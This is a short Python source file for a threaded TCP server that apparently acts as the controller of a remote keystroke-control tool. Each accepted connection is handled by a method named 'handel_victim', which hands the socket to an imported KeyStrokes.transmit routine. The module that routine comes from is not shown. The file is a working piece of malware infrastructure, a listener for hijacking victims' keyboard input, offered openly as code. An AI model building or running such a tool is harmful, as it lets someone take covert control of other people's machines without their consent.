import socket
import sys
import threading
from input_control.keystroke_control import KeyStrokes


class Server:

    def __init__(self, ip, port):
        self.IP = ip
        self.PORT = port
        self.ADDR = (ip, port)
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind(self.ADDR)

    def handel_victim(self, conn):
        KeyStrokes.transmit(conn)

    def start(self):
        self.server.listen()
        print(f'LISTENING... ({self.IP}:{self.PORT})')
        try:
            while True:
                conn, addr = self.server.accept()
                thread = threading.Thread(target=self.handel_victim, args=(conn,))
                thread.start()
        except Exception as e:
            print(e)
            self.server.close()


if __name__ == '__main__':
    print('SERVER IS STARTING :)')
    Server('127.0.0.1', 1245).start()
